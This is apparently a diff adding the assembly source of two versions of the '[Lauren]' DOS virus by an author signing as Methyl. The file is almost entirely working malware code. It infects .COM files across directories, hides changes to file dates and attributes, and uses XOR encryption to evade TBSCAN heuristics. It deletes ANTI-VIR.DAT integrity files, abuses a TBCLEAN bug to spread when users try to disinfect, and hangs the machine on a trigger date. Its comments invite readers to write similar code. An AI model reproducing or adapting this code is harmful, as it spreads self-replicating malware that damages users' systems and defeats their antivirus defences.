@@ -1,0 +1,719 @@
+;                         [Lauren] 1.0 final release
+;
+; Features
+;       - .COM direct action infection
+;       - Critical error handler
+;       - Mini-recursive directory searching
+;       - XOR encryption
+;       - Can activate under TBCLEAN (tested TBAV 7.01 and below)
+; Notes
+;       - Remember when you compile to run the virus through the encryption
+;         process first in DEBUG
+; Bugs
+;       - None :)  Except for crashing when it activates under TBCLEAN while
+;         in a DesqView window.  Can't fix it.  Anyone know how to???????
+; Revision history
+;       - 0.1beta
+;               - Initial sloppy Beta release
+;       - 0.2beta
+;               - TBCLEAN no longer crashes on certain files (well, not
+;                 as often anyway :)
+;               - TBCLEAN now properly cleans the infected file it's run on
+;               - Added rudimentary encryption (lessened TBSCAN flags)
+;               - Decreased code size by about 100 bytes
+;       - 0.3beta
+;               - Non-released version... changed the logic behind the TBCLEAN
+;                 code.  No longer crashes.
+;               - Once again optimised the code length by 20 bytes or so
+;       - 1.0
+;               - Added checks for bloated .COM files
+;               - Created a new mini-recursion system to directory infection
+;               - Added ANTI-VIR.DAT killer routine
+;               - Added a feature that goes into a FAST-INFECT mode if TBCLEAN
+;                 is detected as running
+;               - Re-arranged some code segments in the virus
+;               - Reduced heap requirements by 100 bytes or so
+;               - Changed type of encryption
+;               - Killed off all heuristical flags
+;
+; Dedicated to Lauren... have fun in NYC babe :)  I love you :)  *snuggles*
+;
+;                               - Methyl
+;
+                                ;
+ORG 0100H                       ; .COM file coz it's easier
+                                ;
+        DB 0E9H, 04, 00         ; Jump to virus code
+        DB 'TBAV'               ; Rather large virus marker
+                                ;
+START_VIRUS:                    ;
+        CALL GET_DELTA          ;
+GET_DELTA:                      ;
+        MOV DI, SP              ;
+        MOV BP, SS:[DI]         ;
+        SUB BP, OFFSET GET_DELTA;
+        CLD                     ; Get delta offset the sneaky way
+                                ;
+        CALL ENCODE             ; De-code virus
+                                ;
+ENCODED_START:                  ;
+        MOV DI, 0100H           ;
+        LEA SI, [ORIG_BYTES+BP] ;
+        MOVSW                   ;
+        MOVSW                   ;
+        MOVSW                   ;
+        MOVSB                   ; Restore original host bytes
+                                ;
+        POP DI                  ; Get rid of stack value
+                                ;
+        XOR DL, DL              ;
+        MOV AH, 047H            ;
+        LEA SI, [DIR_BUFFER+BP] ;
+        DB 02EH                 ;
+        INT 021H                ; Save current directory
+        NOP                     ;
+        MOV AX, 03524H          ;
+        DB 02EH                 ;
+        INT 021H                ; Get critical error handler
+        NOP                     ;
+        LEA DI, [OLD_ERROR+BP]  ;
+        MOV [DI], BX            ;
+        MOV [DI+2], ES          ;
+        MOV AX, 02524H          ;
+        LEA DX, [INT_24_HANDLER+BP]
+        DB 02EH                 ;
+        INT 021H                ; Change INT 024H handler
+        NOP                     ;
+;** TBCLEAN check
+        MOV AX, 0FFFFH          ;
+        PUSH AX                 ;
+        POP AX                  ;
+        CLI                     ;
+        DEC SP, 2               ;
+        POP AX                  ;
+        STI                     ;
+        CMP AX, 0FFFFH          ;
+;** End of TBCLEAN check
+        JNE MORE_COUNTER        ; 
+        MOV BYTE PTR [COUNTER+BP], 5
+AFTER_COUNTER:                  ;
+        MOV AH, 04EH            ; Find first
+        JMP DIRECTORY_FIND      ;
+MORE_COUNTER:                   ;
+        MOV BYTE PTR [COUNTER+BP], 10
+        JMP AFTER_COUNTER       ; Infection counter routines :)
+                                ; 
+FIND_FILE:                      ;
+        CMP BYTE PTR [COUNTER+BP], 0
+        JNE COUNTER_NOT_ZERO    ; Check if infection counter has run out
+        JMP END_VIRUS           ;
+COUNTER_NOT_ZERO:               ;
+        PUSH AX                 ;
+        MOV AH, 01AH            ;
+        LEA DX, [OFFSET NEW_DTA+BP]
+        DB 02EH                 ;
+        INT 021H                ; Change to file search DTA
+        NOP                     ; 
+        POP AX                  ;
+        MOV CX, 7               ;
+        LEA DX, [FILE_MASK+BP]  ;
+        DB 02EH                 ;
+        INT 021H                ; Find a file
+        NOP                     ;
+        JNC GOT_FILENAME        ;
+        MOV AH, 04FH            ; This routine infects files in a directory
+                                ;
+DIRECTORY_FIND:                 ;
+        PUSH AX                 ;
+        MOV AH, 01AH            ;
+        LEA DX, [OFFSET DIR_DTA+BP]
+        DB 02EH                 ;
+        INT 021H                ; Change to directory search DTA
+        NOP                     ;
+        MOV AH, 03BH            ;
+        LEA DX, [OFFSET DIR_TRAV+BP]
+        DB 02EH                 ;
+        INT 021H                ; Change to root directory
+        NOP                     ;
+        POP AX                  ;
+        MOV CX, 16              ;
+        LEA DX, [OFFSET DIR_MASK+BP]
+        DB 02EH                 ;
+        INT 021H                ; Find next directory
+        NOP                     ;
+        JC NO_MORE_DIRS         ; Jump if we've visited them all
+        MOV AH, 03BH            ;
+        LEA DX, [DIR_DTA+01EH+BP]
+        DB 02EH                 ;
+        INT 021H                ; Change to next directory
+        NOP                     ;
+        JC NOT_A_DIR            ; Find another directory
+                                ;
+        MOV AX, 04301H          ;
+        XOR CX, CX              ;
+        LEA DX, [KILL_ME+BP]    ; 
+        DB 02EH                 ;
+        INT 021H                ; Take attribs off of any (ANTI-VIR.DAT)
+        NOP                     ;
+                                ;
+        MOV AH, 041H            ;
+        DB 02EH                 ;
+        INT 021H                ; Delete (ANTI-VIR.DAT)
+        NOP                     ;
+                                ;
+        MOV AH, 04EH            ;
+        JMP FIND_FILE           ; Go to find files in new directory
+                                ;
+NO_MORE_DIRS:                   ;
+        JMP END_VIRUS           ; Get outta here if no more DIRS
+                                ;
+NOT_A_DIR:                      ;
+        MOV AH, 04FH            ;
+        JMP DIRECTORY_FIND      ; Find another DIR.. last was invalid
+                                ;
+GOT_FILENAME:                   ;
+        CMP WORD PTR [NEW_DTA+01EH+2+BP],'MM'
+        JNE NOT_COMMAND         ; Check for COMMAND.COM
+        JMP CANT_INFECT_2       ;
+                                ;
+NOT_COMMAND:                    ;
+        XOR AL, AL              ;
+        CALL ATTRIB_FUNC        ;
+        MOV [ATTRIBS+BP],CX     ;
+        MOV WORD PTR [DATE+BP],[NEW_DTA+018H+BP]
+        MOV WORD PTR [TIME+BP],[NEW_DTA+016H+BP]
+                                ; Save date/time/attributes
+        MOV AL,01H              ; 
+        XOR CX, CX              ;
+        CALL ATTRIB_FUNC        ; Kill attributes
+        JNC CAN_WRITE           ;
+        JMP CANT_INFECT_2       ;
+                                ;
+CAN_WRITE:                      ;
+        MOV AX, 03D02H          ;
+        LEA DX, [NEW_DTA+BP+01EH]
+        DB 02EH                 ;
+        INT 021H                ; Open file
+        NOP                     ;
+        XCHG BX, AX             ; Swap file handle into BX
+                                ;
+        MOV AH, 03FH            ;
+        MOV CX, 7               ;
+        LEA DX, [ORIG_BYTES+BP] ;
+        DB 02EH                 ;
+        INT 021H                ; Read set of bytes
+        NOP                     ;
+                                ;
+        CMP [ORIG_BYTES+BP+3], 'BT'
+        JNE INFECT              ;
+        CMP [ORIG_BYTES+BP+5], 'VA'
+        JNE INFECT              ; Check for previous infection
+JMP_ERROR:                      ;
+        JMP CANT_INFECT_1       ;
+                                ;
+INFECT:                         ;
+        CMP [ORIG_BYTES+BP], 'MZ'
+        JE JMP_ERROR            ;
+        CMP [ORIG_BYTES+BP], 'ZM'
+        JE JMP_ERROR            ; Jump if misnamed .EXE file
+                                ;
+        MOV AL, 2               ;
+        CALL MOVE_FP            ;
+        CMP AX, 0F600H          ;
+        JA JMP_ERROR            ; File is too big... bail out
+        SUB AX, 3               ;
+        MOV [JUMPING+BP+1], AX  ; Create JMP construct
+                                ;
+        MOV AH, 02CH            ;
+        DB 02EH                 ;
+        INT 021H                ;
+        NOP                     ;
+                                ;
+        PUSH DX                 ;
+                                ;
+        MOV AH, 02CH            ;
+        DB 02EH                 ;
+        INT 021H                ;
+        NOP                     ;
+                                ;
+        POP CX                  ;
+        MOV [ENCODE_LOOP+BP+2], DL
+        ADD [ENCODE_LOOP+BP+2], CL
+                                ;
+        MOV AH, 040H            ;
+        MOV CX, (HEAP-START_VIRUS)
+        LEA DX, [START_VIRUS+BP];
+        PUSH AX                 ;
+        PUSH CX                 ;
+        PUSH DX                 ;
+        JMP JUMP_OUT            ; For writing to file
+                                ;
+JUMP_IN:                        ;
+        XOR AL, AL              ;
+        CALL MOVE_FP            ;
+        MOV AH, 040H            ;
+        MOV CX, 7               ;
+        LEA DX, [JUMPING+BP]    ;
+        DB 02EH                 ;
+        INT 021H                ; Write JMP construct
+        NOP                     ;
+                                ;
+        DEC BYTE PTR [COUNTER+BP]
+                                ; Decrease infection counter
+CANT_INFECT_1:                  ;
+        MOV AX, 05701H          ;
+        MOV CX, [TIME+BP]       ;
+        MOV DX, [DATE+BP]       ;
+        DB 02EH                 ;
+        INT 021H                ; Restore time/date
+        NOP                     ;
+        MOV AH, 03EH            ;
+        DB 02EH                 ;
+        INT 021H                ; Close the file
+        NOP                     ;
+        MOV AL, 1               ;
+        MOV CX, [ATTRIBS+BP]    ;
+        CALL ATTRIB_FUNC        ; Restore attribs
+                                ;
+CANT_INFECT_2:                  ;
+        MOV AH, 04FH            ;
+        JMP FIND_FILE           ; Close file, find another
+                                ;
+;** Start commonly used routines
+MOVE_FP:                        ;
+        MOV AH, 042H            ;
+        XOR DX, DX              ;
+        XOR CX, CX              ;
+        DB 02EH                 ;
+        INT 021H                ;
+        NOP                     ;
+        RET                     ; Move file pointer
+                                ;
+ATTRIB_FUNC:                    ;
+        MOV AH, 043H            ;
+        LEA DX, [NEW_DTA+BP+01EH]
+        DB 02EH                 ;
+        INT 021H                ;
+        NOP                     ;
+        RET                     ; Give attribs back to file
+                                ;
+;** Data area start
+TEXT:                           ;
+DB '[Lauren] 1.0', 0DH, 0AH     ; 
+DB 'Dedicated with love to Lauren', 0DH, 0AH
+DB 'Have fun in NYC sweetums!!!  *snuggles*', 0DH, 0AH
+DB 'I love you more than anyone else in the world Lauren'
+DB 0DH, 0AH, 0DH, 0AH           ; 
+DB '    Love,', 0DH, 0AH        ;
+DB '    Cody', 0DH, 0AH, 0DH, 0AH
+DB '$'                          ; Message to sweetums
+FILE_MASK DB '*.COM', 0         ; File mask
+DIR_MASK DB '*.*', 0            ;
+DIR_TRAV DB '\', 0              ; For dir traversal
+KILL_ME DB 'ANTI-VIR.DAT', 0    ;
+JUMPING DB 0E9H, 0, 0           ;
+        DB 'TBAV'               ; Marker :)
+ORIG_BYTES DB 0CDH, 020H, 090H  ; 
+           DB 0, 0, 0, 0        ; Host bytes
+;** Data area end
+                                ;
+END_VIRUS:                      ;
+        MOV AX, 02524H          ;
+        MOV DX, CS:[OLD_ERROR+2];
+        MOV DS, DX              ;
+        MOV DX, CS:[OLD_ERROR]  ;
+        DB 02EH                 ;
+        INT 021H                ; Set old critical error handler back
+        NOP                     ;
+        MOV DS, CS              ;
+        MOV ES, CS              ;
+        MOV AH, 03BH            ;
+        LEA DX, [SLASH+BP]      ;
+        DB 02EH                 ;
+        INT 021H                ; Change to original directory
+        NOP                     ;
+        MOV AH, 01AH            ;
+        MOV DX, 080H            ;
+        DB 02EH                 ;
+        INT 021H                ; Restore old DTA
+        NOP                     ;
+        MOV AH, 02AH            ;
+        DB 02EH                 ;
+        INT 021H                ; Check the date
+        NOP                     ;
+        CMP DX, 0520H           ; Is my honey flying out today???
+        JNE NOT_SHOW            ;
+                                ;
+        MOV AX, 3               ;
+        DB 02EH                 ;
+        INT 010H                ; Clear the screen
+        NOP                     ;
+                                ;
+        MOV AH, 9               ;
+        LEA DX, [TEXT+BP]       ;
+        DB 02EH                 ;
+        INT 021H                ; Display message
+        NOP                     ;
+                                ;
+        JMP $                   ; Hang computer
+                                ;
+NOT_SHOW:                       ;
+        MOV AX, 0100H           ;
+        PUSH AX                 ;
+        XOR AX, AX              ; 
+        XOR BX, BX              ;
+        XOR CX, CX              ;
+        XOR DX, DX              ;
+        XOR DI, DI              ;
+        XOR SI, SI              ;
+        XOR BP, BP              ; 
+        RET                     ; Kill all registers and return to host
+                                ;
+ENCODE:                         ;
+        MOV CX, (ENCODE-ENCODED_START)
+        LEA DI, [ENCODED_START+BP]
+ENCODE_LOOP:                    ;
+        XOR BYTE PTR [DI], 0FH  ; 
+        PUSHF                   ;
+        PUSH CS                 ;
+        CALL INT_HELP           ;
+        LOOP ENCODE_LOOP        ;
+        RET                     ; (NOT) encoding routines
+                                ;
+JUMP_OUT:                       ;
+        CALL ENCODE             ; Encode virus
+        POP DX                  ;
+        POP CX                  ;
+        POP AX                  ;
+        DB 02EH                 ;
+        INT 021H                ; Write encoded virus to file
+        NOP                     ;
+        CALL ENCODE             ; Decode virus
+        JMP JUMP_IN             ; Continue along with the virus...
+                                ;
+INT_HELP:                       ;
+        INC DI                  ; To trick TBSCAN encryption heuristic
+INT_24_HANDLER:                 ;
+        MOV AL, 3               ; Critical error handler
+        IRET                    ; 
+                                ;
+SLASH DB '\'                    ; For directory stuff
+HEAP:                           ; Not written to .COM files past this point
+DIR_BUFFER DB 64 DUP(?)         ; Original directory
+OLD_ERROR DW 0, 0               ; For storing INT 24
+ATTRIBS DW 0                    ; Attribs on infected files
+DATE DW 0                       ; Date on infected files
+TIME DW 0                       ; Time on infected files
+COUNTER DB 0                    ; Infection pass counter
+NEW_DTA DB 43 DUP(?)            ; For temporary DTA
+DIR_DTA DB 43 DUP(?)            ; For temporary DTA
+
+================================== Cut Here ================================
+; use A86 to asm this thing
+;                             [Lauren] Virus 0.1b
+;
+; Features
+;       - Activation under TBCLEAN 7.01 and possibly versions below
+;       - .COM direct action infection (it's just an example so fuck you)
+;       - INT 24-Handler
+;       - Directory traversal
+;       - No encryption to hide the flags... because when a TBAV user sees
+;         the flags they try to TBCLEAN the file....  which... to the user...
+;         it apparently does... BUT... the virus has already infected a file
+;         somewhere else on the harddisk....
+;
+; Downfalls
+;       - This exploits a bug in the TBCLEAN software... therefore... of
+;         course... sometimes TBCLEAN acts unpredictably.  Sometimes it
+;         cleans the file correctly... but SOMETIMES... it *MAY* be possible
+;         TBCLEAN will crash totally for no reason... this will be fixed
+;         in an upcoming version of this virus (possibly).
+;
+; Notes
+;       - This isn't supposed to be an ultra-leet virus or anything :)
+;         It's just an experimental lab specimen so YOU TOO can write
+;         TBCLEAN activated viral code!
+;       - A TSR virus... probably could be done pretty easily... my tip
+;         is to exploit the bug ASAP before they fix it up!!!!  
+;       - If you don't understand this code... well, tough luck.  
+;
+; Things I *MIGHT* add if I can be bothered
+;       - Encryption
+;       - Recursive directory moving...
+;       - More extensive checks on TBCLEAN crashing... 
+;
+; Dedicated to Lauren... have fun in NYC babe :)  I love you :)  *snuggles*
+;
+;                               - Methyl
+;
+                                ;
+ORG 0100H                       ; .COM file coz it's easier
+                                ;
+        DB 0E9H, 04, 00         ; Jump to virus code
+        DB 'TBAV'               ; Rather large virus marker
+                                ;
+START_VIRUS:                    ;
+        CALL GET_DELTA          ;
+GET_DELTA:                      ;
+        POP BP                  ;
+        SUB BP, OFFSET GET_DELTA;
+                                ;
+        MOV DI, 0100H           ;
+        LEA SI, [ORIG_BYTES+BP] ;
+        CLD                     ;
+        MOVSW                   ;
+        MOVSW                   ;
+        MOVSW                   ;
+        MOVSB                   ; Restore original host bytes
+                                ;
+        MOV AX, 0FFFFH          ;
+        PUSH AX                 ;
+        POP AX                  ;
+        CLI                     ;
+        SUB SP, 2               ;
+        POP AX                  ;
+        STI                     ; Check for a debugger/TBCLEAN running
+                                ;
+        CMP AX, 0FFFFH          ;
+        JE NOT_UNDER_TBCLEAN    ;
+        JMP KILL_TBCLEAN        ;
+                                ;
+NOT_UNDER_TBCLEAN:              ;
+        DB 02EH                 ;
+        MOV BYTE PTR [TB_FLAG+BP], 0
+                                ;
+NORMAL_VIRUS:                   ;
+        MOV AH, 01AH            ;
+        LEA DX, [NEW_DTA+BP]    ;
+        INT 021H                ; Change to a new DTA
+        XOR DL, DL              ;
+        MOV AH, 047H            ;
+        LEA SI, [DIR_BUFFER+BP] ;
+        INT 021H                ; Save current directory
+        MOV AX, 03524H          ;
+        INT 021H                ;
+        LEA DI, [OLD_ERROR+BP]  ;
+        MOV [DI], BX            ;
+        MOV [DI+2], ES          ;
+        MOV AX, 02524H          ;
+        LEA DX, [INT_24_HANDLER+BP]
+        INT 021H                ; Change INT 024H handler
+        MOV BYTE PTR [COUNTER+BP], 3
+                                ;
+FIND_FIRST_FILE:                ;
+        MOV AH, 04EH            ;
+                                ;
+FIND_FILE:                      ;
+        CMP BYTE PTR [COUNTER+BP], 0
+        JNE COUNTER_NOT_ZERO    ;
+        JMP END_VIRUS           ;
+COUNTER_NOT_ZERO:               ;
+        MOV CX, 7               ;
+        LEA DX, [FILE_MASK+BP]  ;
+        INT 021H                ;
+        JNC GOT_FILENAME        ;
+                                ;
+        MOV AH, 03BH            ;
+        LEA DX, [DIR_TRAV+BP]   ;
+        INT 021H                ;
+        JNC FIND_FIRST_FILE     ;
+        JMP END_VIRUS           ;
+                                ;
+GOT_FILENAME:                   ;
+        CMP WORD PTR [NEW_DTA+01EH+2+BP],'MM'
+        JNE NOT_COMMAND         ;
+        JMP CANT_INFECT_2       ;
+                                ;
+NOT_COMMAND:                    ;
+        XOR AL, AL              ;
+        CALL ATTRIB_FUNC        ;
+        MOV [ATTRIBS+BP],CX     ;
+        MOV WORD PTR [DATE+BP],[NEW_DTA+018H+BP]
+        MOV WORD PTR [TIME+BP],[NEW_DTA+016H+BP]
+        MOV AL,01H              ; Change attribs to normal
+        XOR CX, CX              ;
+        CALL ATTRIB_FUNC        ;
+        JNC CAN_WRITE           ;
+        JMP CANT_INFECT_2       ;
+                                ;
+CAN_WRITE:                      ;
+        MOV AX, 03D02H          ;
+        LEA DX, [NEW_DTA+BP+01EH]
+        INT 021H                ;
+        XCHG BX, AX             ;
+                                ;
+        MOV AH, 03FH            ;
+        MOV CX, 7               ;
+        LEA DX, [ORIG_BYTES+BP] ;
+        INT 021H                ; Read set of bytes
+                                ;
+        CMP [ORIG_BYTES+BP+3], 'BT'
+        JNE INFECT              ;
+        CMP [ORIG_BYTES+BP+5], 'VA'
+        JNE INFECT              ;
+JMP_ERROR:                      ;
+        JMP CANT_INFECT_1       ;
+                                ;
+INFECT:                         ;
+        CMP [ORIG_BYTES+BP], 'MZ'
+        JE JMP_ERROR            ;
+        CMP [ORIG_BYTES+BP], 'ZM'
+        JE JMP_ERROR            ; Jump if misnamed .EXE file
+                                ;
+        MOV AL, 2               ;
+        CALL MOVE_FP            ;
+        SUB AX, 3               ;
+        MOV [JUMPING+BP+1], AX  ;
+        MOV AH, 040H            ;
+        MOV CX, (HEAP-START_VIRUS)
+        LEA DX, [START_VIRUS+BP];
+        INT 021H                ;
+        XOR AL, AL              ;
+        CALL MOVE_FP            ;
+        MOV AH, 040H            ;
+        MOV CX, 7               ;
+        LEA DX, [JUMPING+BP]    ;
+        INT 021H                ;
+                                ;
+        DEC BYTE PTR [COUNTER+BP]
+                                ;
+CANT_INFECT_1:                  ;
+        MOV AX, 05701H          ;
+        MOV CX, [TIME+BP]       ;
+        MOV DX, [DATE+BP]       ;
+        INT 021H                ; Restore time/date
+                                ;
+        MOV AH, 03EH            ;
+        INT 021H                ; Close the file
+                                ;
+        MOV AL, 1               ;
+        MOV CX, [ATTRIBS+BP]    ;
+        CALL ATTRIB_FUNC        ; Restore attribs
+                                ;
+CANT_INFECT_2:                  ;
+        MOV AH, 04FH            ;
+        JMP FIND_FILE           ;
+                                ;
+;** Start commonly used routines
+MOVE_FP:                        ;
+        MOV AH, 042H            ;
+        XOR DX, DX              ;
+        XOR CX, CX              ;
+        INT 021H                ;
+        RET                     ; Move file pointer
+                                ;
+ATTRIB_FUNC:                    ;
+        MOV AH, 043H            ;
+        LEA DX, [NEW_DTA+BP+01EH]
+        INT 021H                ;
+        RET                     ; Give attribs back to file
+                                ;
+END_VIRUS:                      ;
+        MOV AX, 02524H          ;
+        MOV DX, CS:[OLD_ERROR+2];
+        MOV DS, DX              ;
+        MOV DX, CS:[OLD_ERROR]  ;
+        INT 021H                ; Set old critical error handler back
+                                ;
+        PUSH CS                 ;
+        PUSH CS                 ;
+        POP DS                  ;
+        POP ES                  ;
+                                ;
+        MOV AH, 01AH            ;
+        MOV DX, 080H            ;
+        INT 021H                ; Restore old DTA
+                                ;
+        MOV AH, 03BH            ;
+        LEA DX, [SLASH+BP]      ;
+        INT 021H                ; Change to original directory
+                                ;
+        MOV AH, 02AH            ;
+        INT 021H                ;
+                                ;
+        CMP DX, 0520H           ;
+        JNE NOT_SHOW            ;
+                                ;
+        MOV AX, 3               ;
+        INT 010H                ; Clear the screen
+                                ;
+        MOV AH, 9               ;
+        LEA DX, [TEXT+BP]       ;
+        INT 021H                ;
+                                ;
+        JMP $                   ; Show text and hang computer
+                                ;
+NOT_SHOW:                       ;
+        DB 02EH                 ;
+        CMP BYTE PTR [TB_FLAG+BP], 1
+        JE RESTORE_TBCLEAN      ;
+                                ;
+        MOV BX, NOT (0100H)     ;
+        MOV AX, BX              ;
+        XOR BX, BX              ;
+        NOT AX                  ;
+                                ;
+        JMP AX                  ; Restart host
+                                ;
+RESTORE_TBCLEAN:                ;
+        MOV WORD PTR [CS:WHERE], 09090H
+        MOV WORD PTR [CS:WHERE+2], 09090H
+        MOV WORD PTR [CS:WHERE+4], 020CDH
+        MOV DX, CS:[OLDINT1+BP] ;
+        MOV AX, CS:[OLDINT1+BP+2]
+        MOV DS, AX              ;
+        MOV AX, 02501H          ;
+        INT 021H                ; Restore TBCLEAN, execution stops with error
+                                ;
+        INT 020H                ; <-- just in case
+                                ;
+KILL_TBCLEAN:                   ;
+        XOR AX, AX              ;
+        MOV DS, AX              ;
+        LES AX, 4               ;
+        MOV DS, CS              ;
+        MOV [OLDINT1+BP], AX    ;
+        MOV [OLDINT1+BP+2], ES  ; Save old TBCLEAN info
+                                ;
+        MOV AX, 02501H          ;
+        LEA DX, [INT_KILL+BP]   ;
+WHERE:                          ;
+        DB 02EH                 ;
+        INT 021H                ;
+        NOP                     ; Kill TBCLEAN
+                                ;
+        DB 02EH                 ;
+        MOV BYTE PTR [TB_FLAG], 1
+        PUSH CS                 ;
+        POP DS                  ;
+        JMP NORMAL_VIRUS        ; Continue on your merry little way
+                                ;
+INT_24_HANDLER:                 ;
+        MOV AL, 3               ; Critical error handler
+INT_KILL:                       ;
+        IRET                    ; INT 1 handler
+                                ;
+TEXT:                           ;
+DB '[Lauren] Virus 0.1b', 0DH, 0AH
+DB 'Dedicated with love to Lauren....', 0DH, 0AH
+DB 'Have fun in NYC sweetums!!!  *snuggles*', 0DH, 0AH
+DB 0DH, 0AH                     ;
+DB '    Love,', 0DH, 0AH        ;
+DB '    Cody', 0DH, 0AH, '$'    ;
+TB_FLAG DB 0                    ; For TBCLEAN killing
+ORIG_BYTES DB 0CDH, 020H, 090H  ;
+           DB 0, 0, 0, 0        ; Host bytes
+FILE_MASK DB '*.COM', 0         ; File mask
+DIR_TRAV DB '..', 0             ; For dir traversal
+JUMPING DB 0E9H, 0, 0           ;
+        DB 'TBAV'               ; Marker :)
+SLASH DB '\'                    ; For directory stuff
+HEAP:                           ; Not written to .COM files
+DIR_BUFFER DB 64 DUP(?)         ; Original directory
+OLDINT1 DW 0,0                  ; For TBCLEAN killing
+OLD_ERROR DW 0, 0               ; For storing INT 24
+NEW_DTA DB 128 DUP(?)           ; For temporary DTA
+ATTRIBS DW 0                    ; Attribs on infected files
+DATE DW 0                       ; Date on infected files
+TIME DW 0                       ; Time on infected files
+COUNTER DB 0                    ; Infection pass counter
